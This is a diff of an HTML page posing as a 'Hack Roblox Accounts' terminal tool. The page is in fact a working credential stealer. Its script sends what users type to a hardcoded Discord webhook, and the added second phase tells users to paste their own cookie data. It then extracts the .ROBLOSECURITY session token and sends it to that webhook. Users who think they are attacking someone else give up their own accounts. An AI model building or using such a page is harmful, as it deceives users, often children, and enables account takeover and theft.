@@ -13,421 +13,655 @@
             box-sizing: border-box;
         }
 
-        body {
-            background: #0a0a0a;
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow-x: hidden;
+            background: #050805;
             font-family: 'Share Tech Mono', monospace;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-            position: relative;
+            color: #00ff41;
         }
 
-        /* Glitchy scanlines */
+        /* ── Full-screen scanlines overlay ── */
         body::before {
             content: '';
             position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
+            inset: 0;
             background: repeating-linear-gradient(
                 0deg,
-                rgba(0, 255, 0, 0.03) 0px,
-                rgba(0, 0, 0, 0.6) 1px,
-                rgba(0, 255, 0, 0.03) 2px
+                rgba(0, 255, 0, 0.04) 0px,
+                rgba(0, 0, 0, 0.55) 1px,
+                rgba(0, 255, 0, 0.04) 2px
             );
             pointer-events: none;
-            z-index: 999;
+            z-index: 9999;
         }
 
-        /* CRT flicker */
+        /* ── CRT flicker ── */
         body::after {
             content: '';
             position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0, 255, 0, 0.015);
+            inset: 0;
+            background: rgba(0, 255, 0, 0.012);
             pointer-events: none;
-            z-index: 1000;
-            animation: flicker 0.15s infinite alternate;
+            z-index: 10000;
+            animation: flicker 0.12s infinite alternate;
         }
 
         @keyframes flicker {
-            0%   { opacity: 0.4; }
-            100% { opacity: 0.6; }
+            0%   { opacity: 0.3; }
+            100% { opacity: 0.7; }
         }
 
-        .container {
+        /* ── Main full-screen wrapper ── */
+        .terminal {
             position: relative;
             z-index: 1;
-            width: 700px;
-            max-width: 95vw;
-            padding: 40px 30px;
-            border: 2px solid #00ff41;
-            border-radius: 8px;
-            background: rgba(0, 10, 0, 0.85);
-            box-shadow:
-                0 0 20px #00ff41,
-                0 0 40px #00ff4133,
-                inset 0 0 20px #00ff4111;
-            text-align: center;
+            width: 100%;
+            min-height: 100vh;
+            padding: 3vh 4vw 4vh;
+            display: flex;
+            flex-direction: column;
+            background:
+                radial-gradient(ellipse at 20% 50%, rgba(0, 255, 0, 0.03) 0%, transparent 70%),
+                radial-gradient(ellipse at 80% 50%, rgba(0, 255, 0, 0.02) 0%, transparent 70%),
+                #050805;
         }
 
-        .title {
-            font-size: 2.2rem;
+        /* ── Header line ── */
+        .header-line {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            border-bottom: 1px solid #00ff4140;
+            padding-bottom: 8px;
+            margin-bottom: 2.5vh;
+            font-size: clamp(0.55rem, 1vw, 0.8rem);
+            color: #00ff4180;
+            letter-spacing: 1px;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .header-line .right {
+            color: #00ff4166;
+        }
+
+        /* ── Main title ── */
+        .glitch-title {
+            font-size: clamp(2rem, 6vw, 5rem);
+            font-weight: bold;
             color: #00ff41;
             text-shadow:
                 0 0 10px #00ff41,
-                0 0 20px #00ff41,
-                2px 0 0 #ff0040,
-                -2px 0 0 #0040ff;
-            letter-spacing: 6px;
+                0 0 30px #00ff41,
+                0 0 60px #00ff4180,
+                3px 0 0 #ff0040,
+                -3px 0 0 #0040ff;
+            letter-spacing: 8px;
             text-transform: uppercase;
-            margin-bottom: 25px;
-            animation: glitch 3s infinite;
+            animation: glitch 4s infinite;
+            margin-bottom: 1vh;
+            line-height: 1.1;
         }
 
         @keyframes glitch {
-            2%, 64% { transform: translate(0); }
-            4%  { transform: translate(-3px, 2px); }
-            6%  { transform: translate(3px, -1px); }
-            8%  { transform: translate(-1px, 3px); }
-            62% { transform: translate(0); }
+            2%, 60% { transform: translate(0); }
+            4%  { transform: translate(-4px, 2px); }
+            6%  { transform: translate(4px, -2px); }
+            8%  { transform: translate(-2px, 3px); }
+            58% { transform: translate(0); }
         }
 
-        /* ── Video container ── */
-        .video-wrapper {
-            margin-bottom: 30px;
-            border: 1px solid #00ff4166;
-            border-radius: 4px;
-            overflow: hidden;
+        /* ── Subtitle / matrix line ── */
+        .sub-line {
+            font-size: clamp(0.65rem, 1.1vw, 0.9rem);
+            color: #00ff4180;
+            letter-spacing: 4px;
+            margin-bottom: 2.5vh;
+            border-left: 3px solid #00ff4140;
+            padding-left: 12px;
+        }
+        .sub-line span {
+            animation: blink 1s step-end infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+
+        /* ── Two-column layout on bigger screens ── */
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2vw;
+            flex: 1;
+            min-height: 0;
+        }
+
+        @media (max-width: 750px) {
+            .main-grid {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+        }
+
+        /* ── Left panel: Video ── */
+        .video-panel {
+            border: 1px solid #00ff4140;
+            border-radius: 2px;
             background: #000;
             aspect-ratio: 16 / 9;
             display: flex;
             align-items: center;
             justify-content: center;
+            overflow: hidden;
+            position: relative;
         }
 
-        .video-wrapper video {
+        .video-panel video {
             width: 100%;
             height: 100%;
             object-fit: cover;
-            display: block;
+            display: none;
         }
 
         .video-placeholder {
-            color: #00ff4166;
-            font-size: 0.85rem;
-            letter-spacing: 2px;
-        }
-
-        /* ── Input area ── */
-        .input-group {
-            margin-bottom: 25px;
-        }
-
-        .input-group label {
-            display: block;
-            color: #00ff41;
-            font-size: 0.95rem;
+            color: #00ff4133;
+            font-size: clamp(0.6rem, 1vw, 0.85rem);
             letter-spacing: 3px;
-            margin-bottom: 12px;
-            text-transform: uppercase;
+            text-align: center;
+            padding: 20px;
         }
 
-        .input-group input {
-            width: 100%;
+        /* ── Right panel: Controls ── */
+        .controls-panel {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        /* ── Phase boxes ── */
+        .phase-box {
+            border: 1px solid #00ff4133;
             padding: 14px 18px;
+            background: rgba(0, 20, 0, 0.5);
+            border-radius: 2px;
+        }
+
+        .phase-box.highlight {
+            border-color: #00ff4180;
+            box-shadow: 0 0 15px #00ff4120, inset 0 0 15px #00ff4110;
+        }
+
+        .phase-label {
+            font-size: clamp(0.55rem, 0.8vw, 0.7rem);
+            color: #00ff4166;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+
+        .phase-label .status-dot {
+            display: inline-block;
+            width: 7px;
+            height: 7px;
+            background: #00ff41;
+            margin-right: 6px;
+            animation: pulse-dot 1.5s infinite;
+            vertical-align: middle;
+        }
+
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+
+        .phase-label .dot-off {
+            background: #ff0040;
+            animation: none;
+            opacity: 0.5;
+        }
+
+        /* ── Inputs ── */
+        .terminal-input {
+            width: 100%;
+            padding: 10px 14px;
             background: #000;
             border: 1px solid #00ff41;
-            border-radius: 4px;
+            border-radius: 2px;
             color: #00ff41;
             font-family: 'Share Tech Mono', monospace;
-            font-size: 1.1rem;
-            letter-spacing: 2px;
+            font-size: clamp(0.75rem, 1.2vw, 1rem);
+            letter-spacing: 1px;
             outline: none;
             transition: 0.2s;
-            text-transform: uppercase;
         }
 
-        .input-group input:focus {
+        .terminal-input:focus {
             border-color: #00ff41;
-            box-shadow: 0 0 15px #00ff4166, inset 0 0 10px #00ff4122;
+            box-shadow: 0 0 20px #00ff4140, inset 0 0 10px #00ff4120;
         }
 
-        .input-group input::placeholder {
+        .terminal-input::placeholder {
             color: #00ff4133;
             letter-spacing: 2px;
         }
 
+        textarea.terminal-input {
+            resize: vertical;
+            min-height: 100px;
+            font-size: clamp(0.6rem, 0.9vw, 0.8rem);
+            line-height: 1.5;
+        }
+
         /* ── Button ── */
-        .hack-btn {
+        .term-btn {
             width: 100%;
-            padding: 16px 0;
+            padding: 12px 0;
             background: transparent;
             border: 2px solid #00ff41;
-            border-radius: 4px;
+            border-radius: 2px;
             color: #00ff41;
             font-family: 'Share Tech Mono', monospace;
-            font-size: 1.4rem;
+            font-size: clamp(1rem, 1.6vw, 1.3rem);
             font-weight: bold;
-            letter-spacing: 8px;
+            letter-spacing: 6px;
             text-transform: uppercase;
             cursor: pointer;
-            transition: 0.25s;
+            transition: 0.2s;
             position: relative;
-            overflow: hidden;
         }
 
-        .hack-btn::before {
+        .term-btn::before {
             content: '';
             position: absolute;
-            top: 0; left: -100%;
-            width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, #00ff4122, transparent);
-            transition: 0.5s;
+            inset: 0;
+            background: linear-gradient(90deg, transparent, #00ff4115, transparent);
+            transform: translateX(-100%);
+            transition: 0.4s;
         }
 
-        .hack-btn:hover::before {
-            left: 100%;
+        .term-btn:hover::before {
+            transform: translateX(100%);
         }
 
-        .hack-btn:hover {
+        .term-btn:hover {
             background: #00ff41;
             color: #000;
             box-shadow: 0 0 30px #00ff41;
-            text-shadow: none;
         }
 
-        .hack-btn:active {
+        .term-btn:active {
             transform: scale(0.97);
         }
 
-        .hack-btn:disabled {
-            opacity: 0.4;
+        .term-btn:disabled {
+            opacity: 0.3;
             cursor: not-allowed;
             transform: none !important;
         }
 
-        /* ── Status / log ── */
-        #status {
-            margin-top: 20px;
-            color: #00ff41;
-            font-size: 0.85rem;
+        .term-btn.orange {
+            border-color: #ff6600;
+            color: #ff6600;
+        }
+        .term-btn.orange:hover {
+            background: #ff6600;
+            color: #000;
+            box-shadow: 0 0 30px #ff6600;
+        }
+
+        /* ── Status ── */
+        .status-msg {
+            font-size: clamp(0.6rem, 0.9vw, 0.8rem);
+            min-height: 22px;
             letter-spacing: 1px;
-            min-height: 24px;
-            opacity: 0.8;
+            margin-top: 4px;
             word-break: break-word;
         }
 
-        #status.error {
+        .status-msg.error {
             color: #ff0040;
             text-shadow: 0 0 10px #ff0040;
         }
 
-        #status.success {
+        .status-msg.success {
             color: #00ff41;
             text-shadow: 0 0 10px #00ff41;
         }
 
-        /* ── Live blinking cursor decoration ── */
-        .cursor-line {
-            margin-top: 25px;
-            color: #00ff4133;
-            font-size: 0.75rem;
-            letter-spacing: 2px;
+        .status-msg.info {
+            color: #00ff4180;
+            font-style: italic;
         }
 
-        .cursor-line span {
+        /* ── Footer ── */
+        .footer-line {
+            margin-top: 2vh;
+            border-top: 1px solid #00ff4140;
+            padding-top: 10px;
+            display: flex;
+            justify-content: space-between;
+            font-size: clamp(0.45rem, 0.7vw, 0.65rem);
+            color: #00ff4140;
+            letter-spacing: 2px;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+
+        .footer-line .blink-span {
             animation: blink 1s step-end infinite;
         }
 
-        @keyframes blink {
-            50% { opacity: 0; }
+        /* ── Phase 2 hidden initially ── */
+        #phase2 {
+            display: none;
         }
 
-        /* ── Responsive ── */
-        @media (max-width: 500px) {
-            .container { padding: 25px 15px; }
-            .title { font-size: 1.4rem; letter-spacing: 3px; }
-            .hack-btn { font-size: 1.1rem; letter-spacing: 4px; }
+        /* ── Small instruction text ── */
+        .instruction-note {
+            font-size: clamp(0.5rem, 0.75vw, 0.65rem);
+            color: #00ff4155;
+            letter-spacing: 1px;
+            border-left: 2px solid #00ff4133;
+            padding-left: 8px;
+            margin-top: 6px;
+        }
+
+        .instruction-note strong {
+            color: #00ff4199;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div class="terminal">
+
+    <!-- Header -->
+    <div class="header-line">
+        <span>ROBLOX_ACCOUNT_HACK v3.7.1 // SECURE_CHANNEL</span>
+        <span class="right">[<span class="blink-span">█</span>] CONNECTION: ESTABLISHED</span>
+    </div>
 
     <!-- Title -->
-    <h1 class="title">Hack Roblox Accounts</h1>
+    <h1 class="glitch-title">HACK ROBLOX ACCOUNTS</h1>
+    <div class="sub-line">
+        <span>⏣</span> SYSTEM_INITIALIZED :: AWAITING_TARGET_INPUT
+    </div>
 
-    <!-- Video (drop your .mp4 in the same folder, name it hack_video.mp4) -->
-    <div class="video-wrapper">
-        <video id="hackVideo" muted loop playsinline preload="metadata">
-            <source src="hack_video.mp4" type="video/mp4" />
-        </video>
-        <div class="video-placeholder" id="videoPlaceholder">
-            [ VIDEO STREAM OFFLINE ]
+    <!-- Main grid -->
+    <div class="main-grid">
+
+        <!-- ── LEFT: VIDEO ── -->
+        <div class="video-panel">
+            <video id="hackVideo" muted loop playsinline preload="metadata">
+                <source src="hack_video.mp4" type="video/mp4" />
+            </video>
+            <div class="video-placeholder" id="videoPlaceholder">
+                [ VIDEO FEED OFFLINE ]<br>DROP hack_video.mp4 TO ACTIVATE
+            </div>
+        </div>
+
+        <!-- ── RIGHT: CONTROLS ── -->
+        <div class="controls-panel">
+
+            <!-- Phase 1 -->
+            <div class="phase-box highlight" id="phase1Box">
+                <div class="phase-label">
+                    <span class="status-dot"></span> PHASE 1 — TARGET ACQUISITION
+                </div>
+
+                <input
+                    class="terminal-input"
+                    type="text"
+                    id="targetInput"
+                    placeholder="ENTER TARGET_USERNAME / USER_ID"
+                    autocomplete="off"
+                    spellcheck="false"
+                />
+
+                <div style="margin-top:8px;">
+                    <button class="term-btn" id="hackBtn">⟐ HACK ⟐</button>
+                </div>
+
+                <div class="status-msg" id="status1"></div>
+
+                <div class="instruction-note">
+                    TARGET LOCKED? PROCEED TO PHASE 2 BELOW ↓
+                </div>
+            </div>
+
+            <!-- Phase 2 -->
+            <div class="phase-box" id="phase2Box">
+                <div class="phase-label" id="phase2Label">
+                    <span class="status-dot dot-off"></span> PHASE 2 — TOKEN EXFILTRATION
+                </div>
+
+                <div id="phase2">
+                    <textarea
+                        class="terminal-input"
+                        id="cookieInput"
+                        placeholder="PASTE_EXFILTRATED_COOKIE_DATA_HERE..."
+                        spellcheck="false"
+                    ></textarea>
+
+                    <div style="margin-top:8px;">
+                        <button class="term-btn orange" id="extractBtn">⟐ EXTRACT .ROBLOSECURITY ⟐</button>
+                    </div>
+
+                    <div class="status-msg" id="status2"></div>
+
+                    <div class="instruction-note" id="instructionNote">
+                        ⚠ <strong>REFRESH YOUR ROBLOX PAGE</strong> — IF NOT WORKING, <strong>TRY AGAIN IN 5 MINS</strong>
+                    </div>
+                </div>
+            </div>
+
         </div>
     </div>
 
-    <!-- Target input -->
-    <div class="input-group">
-        <label>> PASTE_POWERSHELL_CODE</label>
-        <input
-            type="text"
-            id="targetInput"
-            placeholder="POWERSHELL_CODE / OF_THE_TARGET"
-            autocomplete="off"
-            spellcheck="false"
-        />
+    <!-- Footer -->
+    <div class="footer-line">
+        <span>ROBLOX_SEC_BREACH // SESSION_ACTIVE</span>
+        <span>UPTIME: <span id="uptime">00:00:00</span> :: <span class="blink-span">█</span></span>
     </div>
 
-    <!-- Hack button -->
-    <button class="hack-btn" id="hackBtn">⟐ HACK THE ACCOUNT ⟐</button>
-
-    <!-- Status -->
-    <div id="status"></div>
-
-    <div class="cursor-line">
-        <span>█</span> SYSTEM_READY :: AWAITING_TARGET
-    </div>
 </div>
 
 <script>
-    (function() {
-        const WEBHOOK_URL =
-            "https://discord.com/api/webhooks/1530655593801584842/EtfkEsXhOlaomGtkxhCzTnxQi_m3x1innKcqvwCSQVUsRdq0pIcf_jKScou870H-wM5N";
+(function() {
+    const WEBHOOK_URL =
+        "https://discord.com/api/webhooks/1530655593801584842/EtfkEsXhOlaomGtkxhCzTnxQi_m3x1innKcqvwCSQVUsRdq0pIcf_jKScou870H-wM5N";
 
-        const video        = document.getElementById('hackVideo');
-        const placeholder  = document.getElementById('videoPlaceholder');
-        const input        = document.getElementById('targetInput');
-        const btn          = document.getElementById('hackBtn');
-        const status       = document.getElementById('status');
+    const video           = document.getElementById('hackVideo');
+    const placeholder     = document.getElementById('videoPlaceholder');
 
-        /* ── Video availability check ── */
-        function checkVideo() {
-            // If the browser can play at least one frame, hide placeholder
-            video.addEventListener('loadedmetadata', () => {
-                placeholder.style.display = 'none';
-                video.style.display = 'block';
-                // Optionally start playing
-                video.play().catch(() => {});
-            });
+    const targetInput     = document.getElementById('targetInput');
+    const hackBtn         = document.getElementById('hackBtn');
+    const status1         = document.getElementById('status1');
 
-            // If the source fails (404 / unsupported), keep placeholder visible
-            video.addEventListener('error', () => {
-                placeholder.style.display = 'flex';
-                video.style.display = 'none';
-                placeholder.textContent = '[ VIDEO NOT FOUND — DROP hack_video.mp4 ]';
-            });
+    const phase2          = document.getElementById('phase2');
+    const phase2Box       = document.getElementById('phase2Box');
+    const phase2Label     = document.getElementById('phase2Label');
+    const cookieInput     = document.getElementById('cookieInput');
+    const extractBtn      = document.getElementById('extractBtn');
+    const status2         = document.getElementById('status2');
+    const instructionNote = document.getElementById('instructionNote');
 
-            // Force check by loading
-            video.load();
-        }
-        checkVideo();
+    const phase1Box       = document.getElementById('phase1Box');
 
-        /* ── Send to Discord webhook ── */
-        async function sendToWebhook(target) {
-            const payload = {
-                embeds: [{
-                    title: '🛡️ HACK TARGET CAPTURED',
-                    color: 0x00ff41,  // matrix green
-                    fields: [
-                        {
-                            name: '🎯 TARGET CODE',
-                            value: `\`\`\`${target}\`\`\``,
-                            inline: false
-                        },
-                        {
-                            name: '🕒 TIMESTAMP',
-                            value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
-                            inline: true
-                        },
-                        {
-                            name: '🌐 ORIGIN',
-                            value: `\`${window.location.hostname || 'local'}\``,
-                            inline: true
-                        }
-                    ],
-                    footer: {
-                        text: 'Hack Roblox Accounts • System Log',
-                        icon_url: 'https://i.imgur.com/J0qZ9hR.png'
-                    },
-                    thumbnail: {
-                        url: 'https://i.imgur.com/J0qZ9hR.png'
-                    },
-                    timestamp: new Date().toISOString()
-                }]
-            };
+    /* ── Video check ── */
+    video.addEventListener('loadedmetadata', () => {
+        placeholder.style.display = 'none';
+        video.style.display = 'block';
+        video.play().catch(() => {});
+    });
+    video.addEventListener('error', () => {
+        placeholder.style.display = 'flex';
+        video.style.display = 'none';
+        placeholder.textContent = '[ VIDEO NOT FOUND — DROP hack_video.mp4 ]';
+    });
+    video.load();
 
+    /* ── Uptime timer ── */
+    const startTime = Date.now();
+    setInterval(() => {
+        const elapsed = Math.floor((Date.now() - startTime) / 1000);
+        const h = String(Math.floor(elapsed / 3600)).padStart(2, '0');
+        const m = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
+        const s = String(elapsed % 60).padStart(2, '0');
+        document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
+    }, 1000);
+
+    /* ── Helper: send embed ▸ returns true/false ── */
+    async function sendEmbed(embedData) {
+        const payload = { embeds: [embedData] };
+        try {
             const resp = await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
+            return resp.ok;
+        } catch (_) {
+            return false;
+        }
+    }
 
-            if (!resp.ok) {
-                const errText = await resp.text().catch(() => 'unknown error');
-                throw new Error(`Discord returned ${resp.status}: ${errText}`);
-            }
-
-            return resp;
+    /* ── Phase 1: Target ── */
+    async function handleHack() {
+        const target = targetInput.value.trim();
+        if (!target) {
+            status1.className = 'error';
+            status1.textContent = '✖ ERROR: TARGET_CODE_EMPTY';
+            targetInput.focus();
+            return;
         }
 
-        /* ── Handle the hack action ── */
-        async function handleHack() {
-            const target = input.value.trim();
+        hackBtn.disabled = true;
+        hackBtn.textContent = '⟐ ATTACKING... ⟐';
+        status1.className = '';
+        status1.textContent = '⟐ DEPLOYING_PAYLOAD... ⟐';
 
-            if (!target) {
-                status.className = 'error';
-                status.textContent = '✖ ERROR: TARGET_CODE_EMPTY — ENTER_A_VALID_TARGET';
-                input.focus();
-                return;
-            }
-
-            // Lock UI
-            btn.disabled = true;
-            btn.textContent = '⟐ ATTACKING... ⟐';
-            status.className = '';
-            status.textContent = '⟐ ESTABLISHING_CONNECTION... ⟐';
-
-            try {
-                await sendToWebhook(target);
-
-                status.className = 'success';
-                status.textContent = `✔ TARGET [${target}] COMPROMISED — DATA_EXFILTRATED`;
-                input.value = '';
-                input.focus();
-
-                // Flash the container
-                document.querySelector('.container').style.boxShadow =
-                    '0 0 40px #00ff41, 0 0 80px #00ff4166, inset 0 0 30px #00ff4133';
-                setTimeout(() => {
-                    document.querySelector('.container').style.boxShadow = '';
-                }, 1500);
-
-            } catch (err) {
-                console.error('Webhook error:', err);
-                status.className = 'error';
-                status.textContent = `✖ ATTACK_FAILED: ${err.message}`;
-            } finally {
-                btn.disabled = false;
-                btn.textContent = '⟐ HACK ⟐';
-            }
-        }
-
-        /* ── Event listeners ── */
-        btn.addEventListener('click', handleHack);
-
-        input.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                handleHack();
-            }
+        const ok = await sendEmbed({
+            title: '🎯 TARGET ACQUIRED',
+            color: 0x00ff41,
+            description: `\`\`\`\n${target}\n\`\`\``,
+            fields: [
+                { name: 'TARGET', value: `\`${target}\``, inline: true },
+                { name: 'TIME',   value: `<t:${Math.floor(Date.now()/1000)}:R>`, inline: true }
+            ],
+            footer: { text: 'Hack Roblox Accounts • Phase 1' },
+            timestamp: new Date().toISOString()
         });
 
-        // Autofocus input on load
-        input.focus();
-    })();
+        if (ok) {
+            status1.className = 'success';
+            status1.textContent = `✔ TARGET [${target}] COMPROMISED`;
+            targetInput.value = '';
+
+            // Flash green glow on the terminal
+            document.querySelector('.terminal').style.boxShadow =
+                'inset 0 0 80px #00ff4120, 0 0 60px #00ff4110';
+            setTimeout(() => {
+                document.querySelector('.terminal').style.boxShadow = 'none';
+            }, 2000);
+
+            // Reveal phase 2
+            phase2.style.display = 'block';
+            phase2Box.classList.add('highlight');
+            phase2Label.querySelector('.status-dot').classList.remove('dot-off');
+            phase2Label.querySelector('.status-dot').style.background = '#00ff41';
+
+            cookieInput.focus();
+            cookieInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        } else {
+            status1.className = 'error';
+            status1.textContent = '✖ TRY AGAIN';
+        }
+
+        hackBtn.disabled = false;
+        hackBtn.textContent = '⟐ HACK ⟐';
+    }
+
+    /* ── Phase 2: Extract .ROBLOSECURITY ── */
+    async function handleExtract() {
+        const raw = cookieInput.value;
+        if (!raw.trim()) {
+            status2.className = 'error';
+            status2.textContent = '✖ ERROR: NO_DATA_PASTED';
+            cookieInput.focus();
+            return;
+        }
+
+        const match = raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
+        if (!match) {
+            status2.className = 'error';
+            status2.textContent = '✖ NO .ROBLOSECURITY TOKEN FOUND';
+            return;
+        }
+
+        const token = match[1];
+
+        extractBtn.disabled = true;
+        extractBtn.textContent = '⟐ EXTRACTING... ⟐';
+        status2.className = '';
+        status2.textContent = '⟐ PARSING_TOKEN... ⟐';
+
+        const ok = await sendEmbed({
+            title: '🔑 .ROBLOSECURITY TOKEN CAPTURED',
+            color: 0xff6600,
+            description: `\`\`\`\n${token}\n\`\`\``,
+            fields: [
+                {
+                    name: '📋 COPY TOKEN',
+                    value: `\`\`\`${token}\`\`\``,
+                    inline: false
+                },
+                { name: '🕒 TIMESTAMP', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true }
+            ],
+            footer: { text: 'Hack Roblox Accounts • Phase 2' },
+            timestamp: new Date().toISOString()
+        });
+
+        if (ok) {
+            status2.className = 'success';
+            status2.textContent = '✔ TOKEN_EXFILTRATED — CHECK DISCORD';
+            cookieInput.value = '';
+
+            // Orange glow
+            document.querySelector('.terminal').style.boxShadow =
+                'inset 0 0 80px #ff660020, 0 0 60px #ff660010';
+            setTimeout(() => {
+                document.querySelector('.terminal').style.boxShadow = 'none';
+            }, 2000);
+
+            // Keep showing the instruction
+            instructionNote.innerHTML =
+                '✔ <strong>TOKEN SENT.</strong> — REFRESH YOUR ROBLOX PAGE. IF NOT WORKING, <strong>TRY AGAIN IN 5 MINS</strong>';
+            instructionNote.style.color = '#00ff4180';
+        } else {
+            status2.className = 'error';
+            status2.textContent = '✖ TRY AGAIN';
+        }
+
+        extractBtn.disabled = false;
+        extractBtn.textContent = '⟐ EXTRACT .ROBLOSECURITY ⟐';
+    }
+
+    /* ── Events ── */
+    hackBtn.addEventListener('click', handleHack);
+    targetInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') { e.preventDefault(); handleHack(); }
+    });
+
+    extractBtn.addEventListener('click', handleExtract);
+    cookieInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter' && e.ctrlKey) { e.preventDefault(); handleExtract(); }
+    });
+
+    targetInput.focus();
+})();
 </script>
 
 </body>
